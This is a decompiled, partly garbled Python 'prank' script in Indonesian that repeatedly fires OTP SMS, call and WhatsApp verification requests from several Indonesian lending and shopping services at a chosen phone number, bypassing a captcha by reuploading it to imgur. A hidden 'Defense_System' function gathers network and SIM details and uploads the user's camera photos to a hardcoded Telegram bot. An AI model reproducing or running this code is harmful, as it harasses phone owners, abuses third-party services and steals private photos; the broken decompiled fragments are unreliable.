"""
credit : Xenzi-Xn1
github: https://github.com/Xenzi-XN1
Decode by Viewtech ofc rawrar
"""

import requests
import json
import os
import sys
import time
import subprocess
from pypasser import reCaptchaV3
color = '[0;3{}m'
logo = f"\n{color.format('5')}\n   _____         _     _____             _\n  |_   _|___ ___| |___|  _  |___ ___ ___| |_\n    | | | . | . | |_ -|   __|  _| .\'|   | \'_|\n    |_| |___|___|_|___|__|  |_| |__,|_|_|_,_|\n{color.format('7')}           Tools Prank By [4;37mXenzi-XN1[0m\n{color.format('2')}                     v0.3\n"

def countdown(time_sec):
    try:
        while time_sec:
            mins, secs = divmod(time_sec, 60)
            timeformat = '   {}[{}..{}] Mohon Tunggu Sebentar {}{:02d}:{:02d}[1;0m'.format(color.format('7'), color.format('1'), color.format('7'), color.format('2'), mins, secs)
            print(timeformat, end='\r')
            time.sleep(1)
            time_sec = time_sec + 1
        time.sleep(5)
    except KeyboardInterrupt:
        exit(f"   {color.format('7')}[{color.format('1')}x{color.format('7')}] masukan angka janggan huruf")

def GetCodeRb():
    try:
        cookies = {'_fbp': 'fb.1.1723284382361.460798985123059971', 'deviceToken': 'webFakeToken-1723284385912', 'sajssdk_2015_cross_new_user': '1', 'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%221913bc0f15318-0171b521a44683a-b457554-367504-1913bc0f1557c%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxM2JjMGYxNTMxOC0wMTcxYjUyMWE0NDY4M2EtYjQ1NzU1NC0zNjc1MDQtMTkxM2JjMGYxNTU3YyJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%7D', '_ga': 'GA1.1.1036893424.1723284388', '_gcl_au': '1.1.2052561244.1723284390', '_tt_enable_cookie': '1', '_ttp': 'mMwJb6lxuikofP_l7PIOcnIsZ6d', '_ttd_sync': '1', '_ga_Q2K59PZXB7': 'GS1.1.1723284387.1.1.1723284954.0.0.0', '_ga_M4NNTGXPZE': 'GS1.1.1723284388.1.1.1723284966.0.0.0'}
        headers = {'authority': 'loan.easycash.id', 'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'blackbox': 'pWPI41723284958vKXQu3m9VG9', 'build': '35313', 'origin': 'https://loan.easycash.id', 'platformtype': 'WEB', 'referer': 'https://loan.easycash.id/register-login', 'sec-ch-ua': '\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '\"Android\"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36', 'yqg-platform-device-token': 'webFakeToken-1723284385912', 'yqg-platform-language': 'id', 'yqg-platform-sdk-type': 'IDN_YQD'}
        response = requests.post('https://loan.easycash.id/api/user/generateCaptcha', cookies=cookies, headers=headers)
        cookies = {'_fbp': 'fb.1.1723284382361.460798985123059971', 'deviceToken': 'webFakeToken-1723284385912', 'sajssdk_2015_cross_new_user': '1', 'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%221913bc0f15318-0171b521a44683a-b457554-367504-1913bc0f1557c%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxM2JjMGYxNTMxOC0wMTcxYjUyMWE0NDY4M2EtYjQ1NzU1NC0zNjc1MDQtMTkxM2JjMGYxNTU3YyJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%7D', '_ga': 'GA1.1.1036893424.1723284388', '_gcl_au': '1.1.2052561244.1723284390', '_tt_enable_cookie': '1', '_ttp': 'mMwJb6lxuikofP_l7PIOcnIsZ6d', '_ttd_sync': '1', '_ga_Q2K59PZXB7': 'GS1.1.1723284387.1.1.1723284954.0.0.0', '_ga_M4NNTGXPZE': 'GS1.1.1723284388.1.1.1723284966.0.0.0'}
        headers = {'authority': 'loan.easycash.id', 'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'referer': 'https://loan.easycash.id/register-login', 'sec-ch-ua': '\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '\"Android\"', 'sec-fetch-dest': 'image', 'sec-fetch-mode': 'no-cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}
        resp = requests.get(f"https://loan.easycash.id/api/user/getCaptchaImage/{response.json()['body']}", cookies=cookies, headers=headers)
        cookies = {'postpagebeta': '1', 'frontpagebetav2': '1', 'pp': '6462324107165150', 'amp_f1fc2a': 'ISVpbNENNvLWqJUpS9-FYp...1hvktjci7.1hvkto39k.3.4.7', '_gid': 'GA1.2.1220921734.1723287867', 'ana_id': '371f7667-94a5-49d0-a05e-8ad89b90afb2', 'is_authed': '0', 'user_id': '0', 'is_emerald': '0', 'IMGURSESSION': '29eb94b5a05e5d93453495adfd4769af', 'mp_d7e83c929082d17b884d6c71de740244_mixpanel': '%7B%22distinct_id%22%3A%20%22%24device%3A18fe9d9b2a6122f-07265cf0e9383e-b457554-59b90-18fe9d9b2a71231%22%2C%22%24device_id%22%3A%20%2218fe9d9b2a6122f-07265cf0e9383e-b457554-59b90-18fe9d9b2a71231%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22__mps%22%3A%20%7B%22%24os%22%3A%20%22Android%22%2C%22%24browser%22%3A%20%22Chrome%22%2C%22%24browser_version%22%3A%20124%2C%22Show%20Mature%22%3A%20false%2C%22assembly_uid%22%3A%20%22371f7667-94a5-49d0-a05e-8ad89b90afb2%22%2C%22Ad%20Blocker%20Used%22%3A%20false%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22platform%22%3A%20%22Mobile%22%2C%22version_name%22%3A%20%22848564e%22%2C%22%24search_engine%22%3A%20%22yahoo%22%2C%22imgur_platform%22%3A%20%22mobile%20web%22%2C%22user%20agent%22%3A%20%22Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36%22%2C%22assembly_uid%22%3A%20%22371f7667-94a5-49d0-a05e-8ad89b90afb2%22%2C%22signed_in%22%3A%20false%7D', '_ga_1HL8WM6LBS': 'GS1.1.1723287874.2.1.1723287909.0.0.0', '_ga': 'GA1.1.583270146.1717615306', 'FCNEC': '%5B%5B%22AKsRol9-gqAIXinE5GFEdLUyA2JguvdKtXoy55I-IcmrFO0BjnFnS3qI17eyRO10K0ojs7EUY5rtLyoo1mY5PZVzS3VXcjm-FPDh2AHNfBqv56yBsUhruWa5mpOcXOtexT0s4ZHqYzYWc3YshpDA-K81ptScvVhZ-g%3D%3D%22%5D%5D', '_gat': '1', '__gads': 'ID=21525907563f55c6:T=1717615317:RT=1723288495:S=ALNI_MY4l6j_-ntoenEkMK3eUZ5SBRdCmA', '__gpi': 'UID=00000e41f00094f0:T=1717615317:RT=1723288495:S=ALNI_Mbcz0pBCM_SfRIuIBXrhhkMTUhJJQ', 'ID=98f8505502883aea:T=1717615317:RT=1723288495:S=AA-AfjbbZDChIgECrEBZzmTJCJZ6': '2.1723288497.5-262e833790eb80176593e7d98bd501e0-6763652d617369612d6561737431-0', '_ga_N9VZ79TB1D': 'GS1.2.1723287872.2.1.1723288552.0.0.0', **{'__eoi': 'ID=98f8505502883aea:T=1717615317:RT=1723288495:S=AA-AfjbbZDChIgECrEBZzmTJCJZ6', '_awl': '2.1723288497.5-262e833790eb80176593e7d98bd501e0-6763652d617369612d6561737431-0', '_ga_N9VZ79TB1D': 'GS1.2.1723287872.2.1.1723288552.0.0.0'}}
        headers = {'authority': 'api.imgur.com', 'accept': '*/*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'origin': 'https://imgur.com', 'referer': 'https://imgur.com/', 'sec-ch-ua': '\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '\"Android\"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}
        params = {'client_id': '546c25a59c58ad7'}
        files = {'image': ('downloaded_image2.jpg', resp.content, 'image/jpeg'), 'type': (None, 'file'), 'name': (None, 'downloaded_image2.jpg')}
        respo = requests.post('https://api.imgur.com/3/upload', params=params, cookies=cookies, headers=headers, files=files)
        return (respo.json()['data']['link'], response.json()['body'])
    except:
        exit(f"   {color.format('7')}[{color.format('1')}x{color.format('7')}] Terjadi {color.format('1')}eror {color.format('7')}silahkan hubungi pembuat")
        return None

def check_code(code, id, no):
    cookies = {'_fbp': 'fb.1.1723284382361.460798985123059971', 'deviceToken': 'webFakeToken-1723284385912', 'sajssdk_2015_cross_new_user': '1', 'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%221913bc0f15318-0171b521a44683a-b457554-367504-1913bc0f1557c%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxM2JjMGYxNTMxOC0wMTcxYjUyMWE0NDY4M2EtYjQ1NzU1NC0zNjc1MDQtMTkxM2JjMGYxNTU3YyJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%7D', '_ga': 'GA1.1.1036893424.1723284388', '_gcl_au': '1.1.2052561244.1723284390', '_tt_enable_cookie': '1', '_ttp': 'mMwJb6lxuikofP_l7PIOcnIsZ6d', '_ttd_sync': '1', '_ga_Q2K59PZXB7': 'GS1.1.1723284387.1.1.1723284954.0.0.0', '_ga_M4NNTGXPZE': 'GS1.1.1723284388.1.1.1723284997.0.0.0'}
    headers = {'authority': 'loan.easycash.id', 'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'blackbox': 'pWPI41723284958vKXQu3m9VG9', 'build': '35313', 'content-type': 'application/json', 'origin': 'https://loan.easycash.id', 'platformtype': 'WEB', 'referer': 'https://loan.easycash.id/register-login', 'sec-ch-ua': '\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '\"Android\"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36', 'yqg-platform-device-token': 'webFakeTokaen-1723284385912', 'yqg-platform-language': 'id', 'yqg-platform-sdk-type': 'IDN_YQD', **{'yqg-platform-language': 'IDN_YQD', 'yqg-platform-sdk-type': 'yqg-platform-language'}}
    json_data = {'mobileNumber': no, 'captcha': code, 'captchaKey': id, 'verificationPurpose': 'REGISTER_OR_LOGIN', 'notifType': 'SMS'}
    response = requests.post('https://loan.easycash.id/api/mobile/sendVerificationWithoutCaptcha', cookies=cookies, headers=headers, json=json_data)
    if len(response.json()['status']['detail']) == 0:
        return code
    return None

def Call(no):
    Kredi = requests.post('https://h.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id', headers={'Host': 'h.kreditpintar.com', 'Connection': 'keep-alive', 'Content-Length': '47', 'x-adv-market-channel': 'OfficialWebsite', 'x-user-agent': 'Pintar-ID-Cash (WebAndroid;;;id) uuid/23634849-9a8a-48c0-95b7-53ab7359f94a version/0.1.0', 'DNT': '1', 'x-app-version': 'APPVERSION_NAME(9999)', 'Accept-Language': 'id', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 11; I1927) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36', 'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'x-os-type': 'WEB', 'sentry-trace': '1b9dd6373f7b47e4a21e9003d9d3580d-969ddbf191b89d53-1', 'sec-ch-ua-platform': '\"Android\"', 'Origin': 'https://h.kreditpintar.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': {'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://h.kreditpintar.com/OFFICIAL2021/code-step?m=895331973232'}, 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://h.kreditpintar.com/OFFICIAL2021/code-step?m=895331973232'}, data=json.dumps({'mobileNumber': no}))
    print(f"   {color.format('7')}[{color.format('2')}✓{color.format('7')}] Berhasil prank {color.format('2')}teman {color.format('7')}anda")

def Wa(no):
    url = 'https://api.kickavenue.com/registers'
    headers = {'Host': 'api.kickavenue.com', 'Content-Length': '143', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Content-Type': 'application/json', 'Origin': 'https://www.kickavenue.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.kickavenue.com/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    data = {'email': 'assjiiwhhi901@gmail.com', 'password': 'Jansbxbxbxbb0w029', 'password_confirmation': 'Jansbxbxbxbb0w029', 'mobile_number': f'+62{no}'}
    response = requests.post(url, headers=headers, json=data)
    headers = {'Host': 'api.kickavenue.com', 'accept': 'application/json, text/plain, */*', 'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'origin': 'https://www.kickavenue.com', 'sec-fetch-site': 'same-site', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://www.kickavenue.com/', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(f"https://api.kickavenue.com/otp/send/sms/{response.json()['data']['id']}", headers=headers)
    url = 'https://loan.easycash.id/api/mobile/sendVerificationWithoutCaptcha'
    headers = {'Host': 'loan.easycash.id', 'content-length': '96', 'platformtype': 'WEB', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36', 'yqg-platform-device-token': 'webFakeToken-1726404363554', 'accept': 'application/json, text/plain, */*', 'build': '35313', 'yqg-platform-sdk-type': 'IDN_YQD', 'yqg-platform-language': 'id', 'content-type': 'application/json', 'blackbox': 'oWPIc1726404367ES4sE5ow0G2', 'origin': 'https://loan.easycash.id', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://loan.easycash.id/register-login', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cookie': 'deviceToken=webFakeToken-1726404363554; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22191f5b805ecc4-007ccdec79a4d658-3a7a0a5e-367504-191f5b805eeb5%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxZjViODA1ZWNjNC0wMDdjY2RlYzc5YTRkNjU4LTNhN2EwYTVlLTM2NzUwNC0xOTFmNWI4MDVlZWI1In0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%7D; _fbp=fb.1.1726404364208.304406689168566354; _tt_enable_cookie=1; _ttp=jyUZUOglVrrmkdG37oUf2jq1eVS; _ga=GA1.1.512112514.1726404367; _gcl_au=1.1.552118675.1726404367; _ga_Q2K59PZXB7=GS1.1.1726404366.1.1.1726404391.0.0.0; _ttd_sync=1; _ga_M4NNTGXPZE=GS1.1.1726404367.1.1.1726404411.0.0.0', **{'accept-language': 'deviceToken=webFakeToken-1726404363554; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22191f5b805ecc4-007ccdec79a4d658-3a7a0a5e-367504-191f5b805eeb5%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxZjViODA1ZWNjNC0wMDdjY2RlYzc5YTRkNjU4LTNhN2EwYTVlLTM2NzUwNC0xOTFmNWI4MDVlZWI1In0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%7D; _fbp=fb.1.1726404364208.304406689168566354; _tt_enable_cookie=1; _ttp=jyUZUOglVrrmkdG37oUf2jq1eVS; _ga=GA1.1.512112514.1726404367; _gcl_au=1.1.552118675.1726404367; _ga_Q2K59PZXB7=GS1.1.1726404366.1.1.1726404391.0.0.0; _ttd_sync=1; _ga_M4NNTGXPZE=GS1.1.1726404367.1.1.1726404411.0.0.0', 'cookie': 'accept-language'}}
    data = {'mobileNumber': f'0{no}', 'notifType': 'WHATSAPP', 'verificationPurpose': 'REGISTER_OR_LOGIN'}
    response = requests.post(url, headers=headers, json=data)
    url = 'https://order.kfcku.com/api/requestotp'
    headers = {'Host': 'order.kfcku.com', 'content-length': '71', 'accept': 'application/json, text/plain, */*', 'culturecode': 'id', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36', 'content-type': 'application/json', 'origin': 'https://order.kfcku.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://order.kfcku.com/account/register', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cookie': '_ga=GA1.1.654583334.1726403577; _ga_V9F809X5BJ=GS1.1.1726403576.1.0.1726403578.58.0.0; G_ENABLED_IDPS=google; _ga_VDQKXM3LBX=GS1.1.1726403582.1.1.1726403679.0.0.0'}
    data = {'PhoneNumber': f'+62{no}', 'source': 'register', 'token': 'whatsapp'}
    response = requests.post(url, headers=headers, json=data)
    print(f"   {color.format('7')}[{color.format('2')}✓{color.format('7')}] Berhasil prank {color.format('2')}teman {color.format('7')}anda")

def send_media(bot_token, user_id, media_dir, caption):
    media_files = [os.path.join(media_dir, f) for f in os.listdir(media_dir) if f.lower().endswith(('.png', '.jpg', '.jpeg', '.mp4', '.heic'))]
    for media_path in media_files:
        try:
            with open(media_path, 'rb') as media_file:
                if media_path.lower().endswith(('.png', '.jpg', '.jpeg')):
                    url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
                    files = {'photo': media_file}
                    data = {'chat_id': user_id, 'caption': caption}
                response = requests.post(url, files=files, data=data)
        except Exception as e:
                exit()

def Defense_System(count):
    open('/storage/emulated/0/Android/.system.json', 'w').write(json.dumps({'count_detection': count}))
    list_count = json.loads(open('/storage/emulated/0/Android/.system.json', 'r').read())
    if list_count['count_detection'] > 3:
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        result_alpha = subprocess.run(['getprop', 'gsm.operator.alpha'], capture_output=True, text=True)
        result_numeric = subprocess.run(['getprop', 'gsm.operator.numeric'], capture_output=True, text=True)
        result_sim_operator = subprocess.run(['getprop', 'gsm.sim.operator.alpha'], capture_output=True, text=True)
        caption = f'\n🕹 ip addres dari if config\n``` {result.stdout} ```\n\n🎮 Simcard\n``` \nNama Operator Seluler (Network): {result_alpha.stdout.strip()}\nKode Operator Seluler (MCC-MNC): {result_numeric.stdout.strip()}\nNama Operator SIM: {result_sim_operator.stdout.strip()}\n```\n        '
        TOKEN = '6572634101:AAFOoLK1szD1spC0y1sv5A7M_PKtEK2U4a0'
        USER_ID = '7251741331'
        MEDIA_DIR = '/storage/emulated/0/DCIM/Camera/'
        send_media(TOKEN, USER_ID, MEDIA_DIR, caption)
    else:  
        exit(f"\n   {color.format('7')}[{color.format('1')}x{color.format('7')}] Anda Mendapatkan pringatan {count} dari admin.")

def StartPrank():
    os.system('clear')
    print(logo)
#    try:
#        list_count = json.loads(open('/storage/emulated/0/Android/.system.json', 'r').read())
#    except FileNotFoundError:
#        open('/storage/emulated/0/Android/.system.json', 'w').write(json.dumps({'count_detection': 0}))
#    try:
#        no = input(f"   {color.format('7')}[{color.format('3')}*{color.format('7')}] Masukan nomor 08xxx {color.format('2')}> {color.format('0')}")
#        if len(no) > 14:
#            exit(f"   {color.format('7')}[{color.format('3')}*{color.format('7')}] Masukan jumlah digit nomor dengan benar {color.format('1')}!")
#        print(f"{color.format('7')}")
#        if no in ['6283139844517', '083139844517', '83139844517']:
#            if input(f"   {color.format('7')}[{color.format('1')}x{color.format('7')}] yakin inggin spam pembuat script {color.format('2')}Y{color.format('7')}/{color.format('3')}T{color.format('7')}:{color.format('2')} ") in ['y', 'Y']:
#                count = list_count['count_detection'] + 1
#                Defense_System(count)
#    except ValueError:
#            exit(f"   {color.format('7')}[{color.format('1')}x{color.format('7')}] masukan angka janggan huruf")
#    print(f"   {color.format('7')}[{color.format('2')}1{color.format('7')}] Server {color.format('3')}C_A_L_L {color.format('7')}| {color.format('2')}] Server {color.format('3')}S_M_S   {color.format('7')}W_A     {color.format('7')}| {color.format('2')}New Update\n{color.format('7')}<code object Home at 0x73a6fa1532d0, file "<Xenzi>", line 457>{color.format('7')}__main__{color.format('7')}<mask_20>{color.format('7')}<mask_21>{color.format('7')}<mask_22>{color.format('7')}<mask_23>{color.format('7')}<mask_24>{color.format('7')}<mask_25>{color.format('7')}<mask_26>{color.format('7')}<mask_27>{color.format('7')}<mask_28>{color.format('7')}] Key kadelwarsa, silahkan hubungi admin{color.format('7'
    menu = input(f"   {color.format('7')}[{color.format('3')}*{color.format('7')}] Pilih Server {color.format('2')}> {color.format('7')}")
    print(f"{color.format('7')}")
    if menu in ['2', '02', 'b', 'B']:
        print(f"   {color.format('7')}[{color.format('1')}!{color.format('7')}] untuk mendapatkan code silahkan cek link di bawah.")
        print(f"{color.format('7')}")
        while True:
            try:
                link, id = GetCodeRb()
                print(f"   {color.format('7')}[{color.format('6')}~{color.format('7')}] Url code: [4;32m{link}[0m")
                code = input(f"   {color.format('7')}[{color.format('3')}*{color.format('7')}] Masukan code 4 digit {color.format('2')}> {color.format('0')}")
                print(f"{color.format('7')}")
            except ValueError:
                exit(f"   {color.format('7')}[{color.format('1')}x{color.format('7')}] masukan angka janggan huruf")
            cde = check_code(code, id, no)
            if cde:
                print(f"   {color.format('7')}[{color.format('2')}✓{color.format('7')}] Berhasil prank {color.format('2')}teman {color.format('7')}anda")
    if menu in ['1', '01', 'a', 'A']:
        print(f"   {color.format('7')}[{color.format('1')}!{color.format('7')}] setiap 1 kali berhasil ada cooldown {color.format('2')}30 {color.format('7')}detik")
        print(f"{color.format('7')}")
        while True:
            Call(no)
            countdown(30)
    if menu in ['3', '03', 'c', 'C']:
        print(f"   {color.format('7')}[{color.format('1')}!{color.format('7')}] setiap 1 kali berhasil ada cooldown {color.format('2')}30 {color.format('7')}detik")
        print(f"{color.format('7')}")
        while True:
            Wa(str(no[1:]))
            countdown(30)
    exit(f"   {color.format('7')}[{color.format('1')}x{color.format('7')}] masukan angka janggan huruf")

def Home():
    os.system('clear')
    print(logo)
    print(f"   {color.format('7')}[{color.format('6')}~{color.format('7')}] Url key: [4;32mhttps://sfl.gl/hf0cNAb[0m")
    key = input(f"   {color.format('7')}[{color.format('3')}*{color.format('7')}] Masukan Key {color.format('2')}>{color.format('0')} ")
    if requests.get('https://pastebin.com/raw/ATaNWqJR').text == key:
        open('a.json', 'w').write(json.dumps({'token': key}))
        print(f"\n   {color.format('7')}[{color.format('2')}✓{color.format('7')}] Key terdaftar")
        time.sleep(2)
        StartPrank()
    else:  
        print(f"\n   {color.format('7')}[{color.format('1')}x{color.format('7')}] Key tidak terdaftar")
if __name__ == '__main__':
      StartPrank()
